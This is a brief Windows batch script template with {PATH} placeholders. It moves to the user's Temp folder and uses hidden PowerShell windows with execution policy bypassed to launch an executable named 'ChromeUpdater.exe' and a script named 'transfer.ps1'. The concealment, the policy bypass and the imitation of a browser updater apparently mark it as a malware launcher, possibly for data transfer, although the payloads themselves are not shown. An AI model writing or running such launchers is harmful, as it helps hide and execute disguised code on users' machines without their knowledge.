@ECHO OFF

cd %userprofile%\AppData\Local\Temp
start Powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process '{PATH}\ChromeUpdater.exe';
start Powershell -windowstyle hidden -ExecutionPolicy Bypass -File '{PATH}\transfer.ps1';
